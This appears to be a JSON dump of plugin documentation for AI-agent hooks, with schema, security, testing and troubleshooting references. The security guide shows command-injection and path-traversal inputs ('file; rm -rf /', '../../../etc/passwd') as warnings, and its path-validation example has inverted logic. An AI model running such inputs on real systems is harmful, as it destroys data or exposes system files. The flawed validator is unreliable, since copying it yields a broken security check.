Complex reasoning |\n\n**Recommendation:** Start with command hooks. Only use prompt hooks when semantic understanding is required.\n\n## Validation Checklist\n\n- [ ] Prompt returns valid JSON\n- [ ] JSON includes `ok` field (boolean)\n- [ ] Blocking response includes `reason` field\n- [ ] Timeout configured appropriately\n- [ ] Prompt includes sufficient context\n- [ ] Prompt specifies expected output format\n- [ ] Examples provided for complex decisions\n- [ ] Hook tested with various inputs\n",
        "plugins/sys-core/skills/managing-hooks/references/schema.md": "# Hook Schema Reference\n\n## JSON Structure\n\nHooks are configured in `hooks.json` files. The schema supports events, matchers, and hook definitions.\n\n## Top-Level Structure\n\n```json\n{\n  \"hooks\": {\n    \"EventName\": [\n      {\n        \"matchers\": [\"matcher1\", \"matcher2\"],\n        \"hooks\": [\n          {\n            \"type\": \"command|prompt\",\n            \"command\": \"...\",\n            \"prompt\": \"...\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n## Configuration Locations\n\n| Scope | Location | Use Case |\n|:------|:----------|:---------|\n| **User** | `~/.claude/settings.json` | Personal hooks |\n| **Project** | `.claude/settings.json` | Team-shared hooks |\n| **Local** | `.claude/settings.local.json` | Personal overrides |\n| **Plugin** | `plugins/*/hooks/hooks.json` | Plugin hooks |\n\n## Event Object Structure\n\n### Basic Event\n\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [\n      {\n        \"hooks\": [...]\n      }\n    ]\n  }\n}\n```\n\n### Event with Matchers\n\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [\n      {\n        \"matchers\": [\"startup\", \"resume\"],\n        \"hooks\": [...]\n      }\n    ]\n  }\n}\n```\n\n### Tool-Specific Event\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [...]\n      }\n    ]\n  }\n}\n```\n\n## Hook Definition Structure\n\n### Command Hook\n\n```json\n{\n  \"type\": \"command\",\n  \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/script.sh\",\n  \"timeout\": 30\n}\n```\n\n**Fields:**\n- `type` (required): `\"command\"`\n- `command` (required): Script to execute\n- `timeout` (optional): Timeout in seconds (default: varies)\n\n### Prompt Hook\n\n```json\n{\n  \"type\": \"prompt\",\n  \"prompt\": \"Evaluate if action is safe: $ARGUMENTS\",\n  \"timeout\": 30\n}\n```\n\n**Fields:**\n- `type` (required): `\"prompt\"`\n- `prompt` (required): Prompt for LLM evaluation\n- `timeout` (optional): Timeout in seconds\n\n## Environment Variables\n\n### Available in All Hooks\n\n| Variable | Description | Example |\n|:----------|:-------------|:--------|\n| `$CLAUDE_PROJECT_DIR` | Project root directory | `/Users/user/project` |\n| `${CLAUDE_PROJECT_DIR}` | Same as above (alternative syntax) | `/Users/user/project` |\n\n### Plugin-Specific Hooks Only\n\n| Variable | Description | Example |\n|:----------|:-------------|:--------|\n| `${CLAUDE_PLUGIN_ROOT}` | Plugin root directory | `/path/to/plugin` |\n\n### SessionStart Hooks Only\n\n| Variable | Description | Usage |\n|:----------|:-------------|:------|\n| `$CLAUDE_ENV_FILE` | Environment file path | Write to persist env vars |\n\n## Tool Argument Substitution\n\nIn `PreToolUse` and `PostToolUse` hooks, access tool arguments:\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"echo 'Tool: $TOOL_NAME, Args: $ARGUMENTS'\",\n            \"timeout\": 10\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n## Complete Example\n\n### Project-Level Hooks\n\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [\n      {\n        \"matchers\": [\"startup\"],\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \".claude/scripts/init-env.sh\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ],\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \".claude/scripts/bash-safety.sh\",\n            \"timeout\": 15\n          }\n        ]\n      },\n      {\n        \"matcher\": \"Write\",\n        \"hooks\": [\n          {\n            \"type\": \"prompt\",\n            \"prompt\": \"Check if file write is safe. Path: $ARGUMENTS. Return JSON with ok field.\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ],\n    \"SessionEnd\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \".claude/scripts/cleanup.sh\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n### Plugin-Level Hooks\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"Bash\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/guard.sh\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ],\n    \"SessionStart\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"${CLAUDE_PLUGIN_ROOT}/scripts/validate.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n## Validation\n\n### Schema Validation Checklist\n\n- [ ] Valid JSON syntax\n- [ ] Top-level `hooks` object exists\n- [ ] Event names are valid\n- [ ] Hook definitions have `type` field\n- [ ] Command hooks have `command` field\n- [ ] Prompt hooks have `prompt` field\n- [ ] Timeout values are reasonable\n- [ ] Environment variables use correct syntax\n- [ ] Plugin hooks use `${CLAUDE_PLUGIN_ROOT}`\n- [ ] File paths use absolute paths or correct env vars\n\n### Common Schema Errors\n\n| Error | Cause | Fix |\n|:------|:------|:-----|\n| Invalid JSON | Syntax error | Fix JSON syntax |\n| Unknown event | Typo in event name | Use correct event name |\n| Missing type | Hook definition incomplete | Add `type` field |\n| Wrong env var | `${CLAUDE_PROJECT_DIR}` in plugin hook | Use `$CLAUDE_PROJECT_DIR` or `${CLAUDE_PROJECT_DIR}` |\n| Path traversal | `../other-plugin/script.sh` | Use absolute paths or env vars |\n\n## Best Practices\n\n1. **Use absolute paths** or environment variables\n2. **Set timeouts** to prevent hanging hooks\n3. **Use ${CLAUDE_PLUGIN_ROOT}** in plugin hooks\n4. **Keep hooks fast** - they block execution\n5. **Test exit codes** - verify blocking behavior\n6. **Log failures** - capture stderr for debugging\n7. **Document hooks** - add comments in JSON\n",
        "plugins/sys-core/skills/managing-hooks/references/security.md": "# Security Best Practices\n\n## Core Principles\n\n1. **Never trust user input**\n2. **Validate all paths**\n3. **Use least privilege**\n4. **Audit all operations**\n5. **Never log secrets**\n\n## Input Validation\n\n### File Paths\n\n```bash\n# Validate file path\nif [[ \"$1\" =~ ^[[:alnum:]/._-]+$ ]]; then\n  echo \"Invalid path\" >&2\n  exit 2\nfi\n\n# Sanitize path\nfile_path=$(realpath -m \"$1\")\n```\n\n### Command Arguments\n\n```bash\n# Validate arguments\nif [ ${#} -ne 1 ]; then\n  echo \"Usage: $0 <file_path>\" >&2\n  exit 1\nfi\n```\n\n## Secure Scripting\n\n### Safe Bash Practices\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail  # Exit on error, undefined vars, pipe failures\n\n# Disable globbing\nset -f\n\n# Use variables\nfile_path=\"${1}\"\ncontent=\"${2:-}\"\n\n# Validate before use\n[ -n \"$file_path\" ] || exit 1\n\n# Quote variables\necho \"Processing: $file_path\"\n```\n\n## Common Vulnerabilities\n\n### Path Traversal\n\n### DON'T:**\n```bash\ncat \"$1\"  # Could be ../../../etc/passwd\n```\n\n### DO:**\n```bash\n# Resolve and validate path\nfile_path=$(realpath -m \"$1\")\nif [[ ! \"$file_path\" =~ ^$(pwd)/ ]]; then\n  echo \"Path outside directory\" >&2\n  exit 2\nfi\n```\n\n### Command Injection\n\n### DON'T:**\n```bash\neval \"rm $1\"  # Could be \"file; rm -rf /\"\n```\n\n### DO:**\n```bash\nrm -- \"$1\"  # Use proper argument handling\n```\n\n## Logging Security\n\n- Never log passwords, tokens, or API keys\n- Redact sensitive fields in JSON\n- Use `logger` for system logs\n- Sanitize error messages\n\n## Best Practices Checklist\n\n- [ ] Use `set -euo pipefail`\n- [ ] Validate all inputs\n- [ ] Quote all variables\n- [ ] Check file paths are within allowed directories\n- [ ] Use absolute paths with `${CLAUDE_PLUGIN_ROOT}`\n- [ ] Set appropriate timeouts (max 60s)\n- [ ] Never use `eval` or backticks for user input\n- [ ] Sanitize all outputs\n- [ ] Use least privilege for file permissions\n- [ ] Audit all hook executions\n",
        "plugins/sys-core/skills/managing-hooks/references/testing.md": "# Hook Testing Procedures\n\n## Overview\n\nHooks intercept critical operations. Proper testing is essential to ensure they work correctly without breaking workflows.\n\n## Testing Strategy\n\n### 1. Schema Validation\n\nTest that `hooks.json` is valid JSON and follows the schema.\n\n```bash\n# Validate JSON syntax\njq empty hooks/hooks.json\n\n# Check for required fields\njq '.hooks' hooks/hooks.json\n\n# List configured events\njq '.hooks | keys' hooks/hooks.json\n```\n\n### 2. Hook Script Testing\n\nTest hook scripts independently before integrating.\n\n```bash\n# Test with success case\necho '{\"file_path\": \"test.txt\"}' | hooks/scripts/validate.sh\necho \"Exit code: $?\"\n\n# Test with failure case\necho '{\"file_path\": \"/etc/passwd\"}' | hooks/scripts/validate.sh\necho \"Exit code: $?\"\n```\n\n### 3. Exit Code Testing\n\nVerify exit codes produce correct behavior.\n\n**Test Exit Code 0 (Success):**\n```bash\n#!/bin/bash\n# test-success.sh\nexit 0\n```\n\nExpected: Action continues, no error shown.\n\n**Test Exit Code 1 (Warning):**\n```bash\n#!/bin/bash\n# test-warning.sh\necho \"Warning: minor issue\" >&2\nexit 1\n```\n\nExpected: Action continues, warning shown.\n\n**Test Exit Code 2 (Blocking):**\n```bash\n#!/bin/bash\n# test-block.sh\necho \"Error: action blocked\" >&2\nexit 2\n```\n\nExpected: Action blocked, error shown.\n\n### 4. Integration Testing\n\nTest hooks within the actual runtime environment.\n\n#### SessionStart Hook Test\n\n**Test Hook:**\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [{\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"echo 'Session started' > /tmp/session-start-test.txt\"\n      }]\n    }]\n  }\n}\n```\n\n**Test Procedure:**\n1. Start Claude Code\n2. Check if file was created: `cat /tmp/session-start-test.txt`\n3. Clear and restart to verify it runs again\n\n#### PreToolUse Hook Test\n\n**Test Hook:**\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [{\n      \"matcher\": \"Write\",\n      \"hooks\": [{\n        \"type\": \"command\",\n        \"command\": \"grep -o '\\\"file_path\\\":\\\"[^\\\"]*\\\"' | grep -o '/etc/' && exit 2 || exit 0\"\n      }]\n    }]\n  }\n}\n```\n\n**Test Procedure:**\n1. Try writing to safe file: Should succeed\n2. Try writing to `/etc/`: Should be blocked\n\n#### Prompt Hook Test\n\n**Test Hook:**\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [{\n      \"hooks\": [{\n        \"type\": \"prompt\",\n        \"prompt\": \"Return JSON: {\\\"ok\\\": true}\"\n      }]\n    }]\n  }\n}\n```\n\n**Test Procedure:**\n1. Invoke any tool\n2. Verify action continues (ok: true response)\n\n## Common Issues and Solutions\n\n### Issue: Hook Not Running\n\n**Symptoms:** Hook script never executes\n\n**Diagnosis:**\n```bash\n# Check hook file exists\nls -la hooks/hooks.json\n\n# Check JSON is valid\njq empty hooks/hooks.json\n\n# Check event name spelling\njq '.hooks | keys' hooks/hooks.json\n```\n\n**Solutions:**\n- Ensure `hooks.json` is in correct location\n- Verify JSON syntax is valid\n- Check event name is correct\n\n### Issue: Exit Code Not Working\n\n**Symptoms:** Exit code 2 doesn't block action\n\n**Diagnosis:**\n```bash\n# Test script directly\n./hooks/scripts/block.sh\necho \"Exit code: $?\"\n\n# Check script has execute permission\nls -l hooks/scripts/block.sh\n\n# Check shebang line\nhead -1 hooks/scripts/block.sh\n```\n\n**Solutions:**\n- Add execute permission: `chmod +x hooks/scripts/block.sh`\n- Add shebang: `#!/bin/bash` or `#!/usr/bin/env python3`\n- Ensure exit code is actually 2, not 1\n\n### Issue: Prompt Hook Timing Out\n\n**Symptoms:** Hook hangs, then timeout error\n\n**Diagnosis:**\n```bash\n# Check prompt complexity\njq '.hooks[].hooks[].prompt | length' hooks/hooks.json\n\n# Check timeout value\njq '.hooks[].hooks[].timeout' hooks/hooks.json\n```\n\n**Solutions:**\n- Simplify prompt\n- Increase timeout if needed\n- Consider command hook instead\n\n### Issue: Environment Variables Not Available\n\n**Symptoms:** Script can't access `${CLAUDE_PLUGIN_ROOT}`\n\n**Diagnosis:**\n```bash\n# Test env var in script\necho \"Plugin root: ${CLAUDE_PLUGIN_ROOT}\" > /tmp/env-test.txt\n\n# Check location (plugin vs project hooks)\n# ${CLAUDE_PLUGIN_ROOT} only available in plugin hooks\n```\n\n**Solutions:**\n- Use `$CLAUDE_PROJECT_DIR` for project hooks\n- Use `${CLAUDE_PLUGIN_ROOT}` for plugin hooks\n- Use absolute paths as fallback\n\n## Automated Testing\n\n### Test Script Template\n\n```bash\n#!/bin/bash\n# test-hooks.sh\n\necho \"Testing hooks...\"\n\n# Test 1: Schema validation\necho \"Test 1: Schema validation\"\njq empty hooks/hooks.json || exit 1\n\n# Test 2: Success case\necho \"Test 2: Success exit code\"\necho '{}' | hooks/scripts/validate.sh\n[ $? -eq 0 ] || exit 1\n\n# Test 3: Blocking case\necho \"Test 3: Blocking exit code\"\necho '{\"dangerous\": true}' | hooks/scripts/validate.sh\n[ $? -eq 2 ] || exit 1\n\n# Test 4: Warning case\necho \"Test 4: Warning exit code\"\necho '{}' | hooks/scripts/warning.sh\n[ $? -eq 1 ] || exit 1\n\necho \"All tests passed!\"\n```\n\n### Integration Test Template\n\n```bash\n#!/bin/bash\n# integration-test.sh\n\necho \"Integration testing hooks...\"\n\n# Setup\nexport TEST_DIR=\"/tmp/hook-test-$$\"\nmkdir -p \"$TEST_DIR\"\n\n# Test SessionStart\necho \"Test: SessionStart hook\"\n# Start Claude with test hook\n# Check if test file was created\n\n# Test PreToolUse\necho \"Test: PreToolUse hook\"\n# Trigger tool use\n# Check if hook blocked/allowed correctly\n\n# Cleanup\nrm -rf \"$TEST_DIR\"\n\necho \"Integration tests passed!\"\n```\n\n## Validation Checklist\n\n### Schema Validation\n\n- [ ] `hooks.json` is valid JSON\n- [ ] Top-level `hooks` object exists\n- [ ] Event names are correct\n- [ ] Hook definitions have required fields\n\n### Script Validation\n\n- [ ] Scripts have execute permissions\n- [ ] Scripts have shebang line\n- [ ] Scripts return correct exit codes\n- [ ] Error messages written to stderr\n\n### Integration Validation\n\n- [ ] Hooks run on expected events\n- [ ] Exit code 0 allows actions\n- [ ] Exit code 1 warns but continues\n- [ ] Exit code 2 blocks actions\n- [ ] Prompt hooks return valid JSON\n- [ ] Timeouts are appropriate\n\n### Performance Validation\n\n- [ ] Hooks complete quickly (<5 seconds for command hooks)\n- [ ] Prompt hook timeouts configured\n- [ ] No unnecessary LLM calls\n- [ ] Minimal performance impact\n\n## Best Practices\n\n1. **Test scripts independently** before integrating\n2. **Use exit code assertions** in tests\n3. **Test both success and failure cases**\n4. **Verify timeout behavior**\n5. **Check performance impact**\n6. **Log hook execution** for debugging\n7. **Use gradual rollout** for production hooks\n",
        "plugins/sys-core/skills/managing-hooks/references/troubleshooting.md": "# Troubleshooting Guide\n\n## Common Issues\n\n### Issue: Hook Not Firing\n\n**Symptoms:**\n- Hook configuration exists but doesn't trigger\n- No error messages\n\n**Diagnosis:**\n```bash\n# Check JSON syntax\njq . hooks/hooks.json\n\n# Verify matcher pattern\njq '.hooks.PreToolUse[0].matcher' hooks/hooks.json\n```\n\n**Solutions:**\n1. Verify matcher pattern matches tool name\n2. Check JSON syntax\n3. Restart Claude session\n4. Enable debug logging\n\n### Issue: Hook Timeout\n\n**Symptoms:**\n- Hook execution takes too long\n- \"Timeout\" error message\n\n**Diagnosis:**\n```bash\n# Test hook manually\nbash ${CLAUDE_PLUGIN_ROOT}/scripts/hook.sh test_input\n```\n\n**Solutions:**\n1. Increase timeout in configuration\n2. Optimize hook script performance\n3. Break complex operations into smaller checks\n4. Use background processes for long operations\n\n### Issue: Permission Denied\n\n**Symptoms:**\n- \"Permission denied\" error\n- Script not executable\n\n**Diagnosis:**\n```bash\n# Check file permissions\nls -la scripts/\n\n# Test execution\nbash scripts/hook.sh\n```\n\n**Solutions:**\n1. Make scripts executable: `chmod +x scripts/*.sh`\n2. Check file ownership\n3. Verify SELinux/AppArmor policies\n4. Run with appropriate user permissions\n\n### Issue: Invalid JSON Output\n\n**Symptoms:**\n- \"Invalid JSON\" error\n- Hook output not processed\n\n**Diagnosis:**\n```bash\n# Test output format\nbash scripts/hook.sh | jq .\n\n# Check for debug output\nbash -x scripts/hook.sh\n```\n\n**Solutions:**\n1. Ensure output is valid JSON\n2. Add error handling to script\n3. Suppress debug output with `suppressOutput: true`\n4. Use `set -euo pipefail` for safety\n\n### Issue: Unexpected Exit Code\n\n**Symptoms:**\n- Hook fails with non-zero exit code\n- Operation blocked or allowed incorrectly\n\n**Diagnosis:**\n```bash\n# Test with sample input\necho '{\"test\": \"data\"}' | bash scripts/hook.sh\necho \"Exit code: $?\"\n```\n\n**Solutions:**\n1. Use proper exit codes (0, 1, 2, 124)\n2. Add error messages to stderr\n3. Test with various inputs\n4. Validate exit code behavior\n\n## Debug Mode\n\nEnable verbose logging:\n\n```json\n{\n  \"hooks\": {\n    \"PreToolUse\": [\n      {\n        \"matcher\": \"*\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"bash -x ${CLAUDE_PLUGIN_ROOT}/scripts/debug.sh\",\n            \"timeout\": 30\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n## Testing Hooks\n\n### Unit Test Script\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\n# Test input\ntest_input='{\n  \"session_id\": \"test\",\n  \"hook_event_name\": \"PreToolUse\",\n  \"tool_name\": \"Write\"\n}'\n\n# Run hook\noutput=$(echo \"$test_input\" | bash scripts/hook.sh)\necho \"Output: $output\"\n\n# Validate JSON\necho \"$output\" | jq .\n\n# Check exit code\nif [ $? -eq 0 ]; then\n  echo \" Test passed\"\nelse\n  echo \" Test failed\"\n  exit 1\nfi\n```\n\n### Test Cases\n\n1. **Valid input** - Normal operation\n2. **Invalid input** - Error handling\n3. **Missing fields** - Validation\n4. **Large input** - Performance\n5. **Timeout scenario** - Long operation\n\n## Logging and Monitoring\n\n### Add Logging\n\n```bash\nexec 3>&1 4>&2\nexec 1> >(tee -a /tmp/hook.log)\nexec 2>&1\n\n# Hook logic\necho \"Hook executed at $(date)\"\n\n# Restore\nexec 1>&3 2>&4\n```\n\n### Monitor Performance\n\n```bash\nstart=$(date +%s%3N)\n# ... operation ...\nend=$(date +%s%3N)\nduration=$((end - start))\n\n{\n  \"continue\": true,\n  \"systemMessage\": \"Execution time: ${duration}ms\"\n}\n```\n\n## Getting Help\n\n1. Check logs: `/tmp/hook.log`\n2. Test manually: `bash scripts/hook.sh`\n3. Validate JSON: `jq . hooks/hooks.json`\n4. Review timeout settings\n5. Check file permissions\n6. Test with sample data\n7. Review security policies\n8. Check environment variables\n\n## Prevention Checklist\n\n- [ ] All scripts use `set -euo pipefail`\n- [ ] JSON validation in place\n- [ ] Appropriate timeouts set\n- [ ] File permissions correct\n- [ ] Error handling implemented\n- [ ] Logging configured\n- [ ] Tests written and passing\n- [ ] Documentation updated\n- [ ] Performance tested\n- [ ] Security reviewed\n",
        "plugins/sys-core/skills/repairing-state/SKILL.md": "---\nname: repairing-state\ndescription: \"Performs forensic investigation and applies permanent fixes. MUST USE when diagnosing component failures, hallucinations, or instruction drift. Do not use for routine tasks, standard debugging, or preventive maintenance.\"\ncontext: fork\nallowed-tools: [Task, Read, Write, Edit, Glob, Grep]\n---\n\n# Forensic Healing Protocol\n\n## Phase 0: Target Acquisition\nYou MUST first resolve the user's input to a concrete file path:\n1. **Validation**: Check if the input is already a valid absolute or relative path.\n2. **Search**: If it's a name (e.g., \"manage-healing\"), use `find_by_name` to locate the `SKILL.md` or component definition.\n3. **Ambiguity Resolution**: If multiple files match, pick the one in `plugins/` that matches the component type (Agent, Skill, Command).\n\n## Phase 1: Evidence Retrieval (Forensics)\nYou MUST analyze the \"Black Box\" of the failure by reading the following state files:\n1. **The Pulse**: `.cattoolkit/context/context.log` (Find the exact timestamp of the error).\n2. **The Memory**: `.cattoolkit/context/scratchpad.md` (Check the agent's intent vs. its tool usage).\n3. **The Guard**: `hooks/hooks.json` (Verify if a hook intercepted the tool call).\n4. **The Manifesto**: The failing `SKILL.md`, `agent.md`, or `command.md`.\n\n## Phase 2: Diagnosis (Drift Detection)\nCompare the **Tool Prompt** (from context.log) against the **Instructions** (from the manifesto).\n- **Hallucination**: The model used a tool argument not defined in the skill.\n- **Interception**: A hook returned a `block` status that the agent didn't handle.\n- **Instruction Drift**: The skill provides an example that is incompatible with the current toolkit version.\n\n## Phase 3: The Healing Fix\nDO NOT revert files. Update the logic to be more resilient:\n1. **Correct the Example**: Update the Markdown code block to show the correct tool signature.\n2. **Harden Constraints**: Add a `## Constraints` section with specific `MUST NOT` instructions addressing the error.\n3. **Path Sanitization**: If the error was a \"File Not Found,\" add a \"Context Discovery\" step to the protocol.\n\n## Phase 4: Prevention (Immunization)\nUpdate the component's **Description** keywords to better match its actual successful triggers, and add a \"Troubleshooting\" section to the bottom of the component's file documenting this fix.\n\n## Reference Assets\n- [bootstrap-protocol.md](references/bootstrap-protocol.md): Protocol for initializing healing environment\n- Cross-skill standards: Refer to the `toolkit-registry` skills `standards-communication` reference when you need shared policies.\n- [diagnosis-patterns.md](references/diagnosis-patterns.md): Common error patterns\n- [bootstrap.sh](assets/scripts/bootstrap.sh): Environment setup script\n",
        "plugins/sys-core/skills/repairing-state/references/bootstrap-protocol.md": "# Bootstrap Protocol\n\nThe Bootstrap Protocol is the Emergency Safe Mode for the Cat Toolkit. It is designed to break circular dependencies and restore core functionality when AI-driven repair tools fail.\n\n## When to use Bootstrap\n\nInvoke `/bootstrap` when:\n1. `/heal` or `/build` fails with a Python traceback (e.g., in `hook-tester.py`).\n2. Meta-skills are hallucinating or looping.\n3. Core management skills (like `manage-hooks`) are corrupted.\n4. You need to reset the system to a last known good state without agent interference.\n\n## Recovery Decision Tree\n\n1. **Specific File Corruption?**\n   -  Use `git checkout HEAD -- <path>` or `/bootstrap <path>`.\n2. **Major Meta-Plugin Drift?**\n   -  Use `/bootstrap plugins/sys-core`.\n3. **Catastrophic \"AI Hallucination\" State?**\n   -  Use `/bootstrap --hard 1` to revert the last commit.\n4. **Local Repository Corrupted?**\n   -  Use `/bootstrap --remote plugins/sys-core`.\n\n## Manual Recovery (Agent-less)\n\nIf Claude Code is unable to execute even basic commands, use the standalone script from your terminal:\n\n```bash\n./plugins/sys-core/skills/manage-healing/assets/scripts/bootstrap.sh soft\n```\n\n## Safety Mechanisms\n\n- **Deterministic:** Uses pure git (no model reasoning required for the actual restore).\n- **Vector Pattern:** Runs in the main conversation context to preserve diagnostic visibility.\n- **Zero Dependencies:** Does not rely on Python, Node.js, or any plugin-specific logic beyond basic Bash.\n",
        "plugins/sys-core/skills/repairing-state/references/diagnosis-patterns.md": "# Diagnosis Patterns\n\nDecision tree for identifying the root cause of a failure during the `/heal` workflow.\n\n## 1. Tool Usage Failures\n\n**Did the AI try to use a tool and fail?**\n\n- **Yes, \"Tool not found\":** The Skill/Agent definition lists a tool that isn't in `allowed-tools` or installed.\n  - *Fix:* Update `allowed-tools` or remove the instruction.\n- **Yes, \"Invalid arguments\":** The Skill/Agent provides an example with wrong syntax.\n  - *Fix:* Correct the `<example>` block in the markdown.\n\n## 2. Context Failures\n\n**Did the AI ask a question it should have known?**\n\n- **Yes:** The component failed to load necessary reference files.\n  - *Fix:* Add `@reference` links to the Command or Agent prompt.\n\n## 3. Orchestration Failures\n\n**Did a subagent fail to complete the task?**\n\n- **Yes, returned early:** Ambiguous success criteria.\n  - *Fix:* Add explicit \"Success Criteria\" section to the Agent prompt.\n- **Yes, hung/looped:** Missing \"Stop\" condition or \"Handoff\" protocol.\n  - *Fix:* Add HANDOFF protocol to the Agent.\n\n## 4. Output Format Failures\n\n**Did the AI produce malformed output?**\n\n- **Yes, wrong structure:** Missing or incorrect example in component definition.\n  - *Fix:* Add concrete `<example>` block with correct input/output pair.\n- **Yes, wrong encoding:** JSON/YAML syntax issues in frontmatter or examples.\n  - *Fix:* Validate and correct syntax errors.\n\n## 5. Permission/Safety Failures\n\n**Did the AI attempt a blocked operation?**\n\n- **Yes, file access denied:** Missing tool in `allowed-tools` or path outside scope.\n  - *Fix:* Update `allowed-tools` or clarify path constraints.\n- **Yes, violated constraint:** Weak constraint language (suggestion vs requirement).\n  - *Fix:* Harden constraint with MUST/NEVER uppercase language.\n",
        "plugins/sys-edge/.claude-plugin/plugin.json": "{\n  \"name\": \"sys-edge\",\n  \"version\": \"1.0.2\",\n  \"description\": \"EDGE & TOOLING DOMAIN - Edge AI, mobile optimization, offline-first systems, Python tooling, and resource-constrained environments\",\n  \"license\": \"MIT\",\n  \"author\": {\n    \"name\": \"Git-Fg\"\n  },\n  \"keywords\": [\n    \"edge\",\n    \"mobile\",\n    \"optimization\",\n    \"offline-sync\",\n    \"python-tools\",\n    \"uv\",\n    \"ruff\"\n  ]\n}\n",
        "plugins/sys-edge/README.md": "# sys-edge\n\n**Edge AI & Mobile Optimization** - Resource-constrained AI deployment for mobile and edge devices.\n\n## Standards Integration\n\nThis plugin follows 2026 Universal Agentic Runtime standards:\n\n- **[Toolkit Registry Standards](../sys-core/skills/adhering-standards/SKILL.md)** - Component management\n- **[Execution Core](../sys-builder/skills/adhering-execution-standard/SKILL.md)** - Behavioral protocols\n- **[Security Standards](../sys-core/skills/auditing-security/SKILL.md)** - Security patterns\n\nFor component creation, use:\n- `use sys-core`  `toolkit-registry` skill\n- `use sys-builder`  `scaffold-component` skill\n\n## Purpose\n\nOptimizes AI models for deployment on mobile devices and edge environments through intelligent resource management, quantization, and battery-aware processing.\n\n## Skills\n\n### experimenting-edge\n**Model management for resource-constrained environments**\n\n- Lazy loading models on-demand\n- Dynamic quantization (int4, int8, fp16)\n- Memory pressure detection and LRU eviction\n- Sliding window with semantic chunking\n- Battery-optimized batch inference\n- Thermal management and throttling\n\n### synchronizing-data\n**Encrypted offline-first synchronization**\n\n- User-key encrypted local storage\n- Intelligent conflict resolution (timestamp, priority, merge)\n- Incremental delta-based sync\n- Privacy-first architecture (zero-knowledge)\n- Explicit permission-based sync\n\n## Implementation Example\n\n```python\n# Optimize AI model for mobile deployment\nfrom edge_ai import EdgeAIManager\n\n# Initialize edge optimization\nmanager = EdgeAIManager()\n\n# Load model with mobile optimization\nmodel = manager.load_model(\n    model_name=\"text_generator\",\n    constraints={\n        \"available_ram_gb\": 4,\n        \"battery_percent\": 65,\n        \"priority\": \"balanced\"\n    }\n)\n\n# Run with battery awareness\nresult = model.generate(input_data)\n```\n\n## Roadmap Alignment\n\n**Project 1: AI Powered Mobile App with SLM (Beginner Level)**\n- [x] Model management with lazy loading\n- [x] Dynamic quantization strategies\n- [x] Context window management\n- [x] Battery optimization\n- [x] Offline-first sync architecture\n\n## Features\n\n- **Zero API Costs**: All processing on-device\n- **Complete Privacy**: User-controlled encryption\n- **Resource Efficient**: < 60% RAM usage\n- **Battery Smart**: < 5% drain per hour\n- **Thermal Safe**: Automatic throttling at 75C\n\n## Commands\n\n\n\n## Usage\n\nUse `experimenting-edge` for:\n- Mobile AI application optimization\n- Edge device deployment\n- Resource-constrained environments\n- Battery-aware processing\n- Thermal management\n\nUse `synchronizing-data` for:\n- Offline-first data storage\n- Encrypted local databases\n- Conflict-free sync\n\n## Technical Details\n\n### Quantization Levels\n- **int4**: < 4GB RAM devices (pre-2020)\n- **int8**: 4-8GB RAM devices\n- **fp16**: > 8GB RAM devices\n\n### Battery Optimization\n- Batch processing reduces wake cycles by 70%\n- Adaptive quality maintains user experience\n- Background deferral for non-critical tasks\n\n### Privacy Architecture\n- User-controlled encryption keys\n- No raw data transmission\n- Optional sync with explicit permission\n- Complete offline functionality\n\n## Next Steps\n\n1. Integrate with `sys-multimodal` for mobile video editing\n2. Add hardware-specific optimizations (NNAPI, CoreML)\n3. Implement predictive battery optimization\n4. Build peer-to-peer sync capabilities\n\n## License\n\nMIT\n",
        "plugins/sys-edge/commands/migrate-python.md": "---\ndescription: \"Migrate legacy Python (pip/conda/poetry) to modern UV standards. Auto-detects project type and converts configuration to UV with Ruff linting.\"\nargument-hint: \"no args (detects automatically)\"\nallowed-tools: [Skill(managing-python), Bash]\ndisable-model-invocation: true\n---\n\n# Python Migration Assistant\n\nModernize your Python project with UV and Ruff for faster, cleaner development.\n\n**This command automatically:**\n1. Detects legacy configs (`requirements.txt`, `setup.py`, `environment.yml`, `pyproject.toml`)\n2. Initializes UV project structure\n3. Imports dependencies\n4. Sets up Ruff for linting\n5. Deletes legacy artifacts (with confirmation)\n\nInvoke `Skill(managing-python)` to perform the migration workflow.\n",
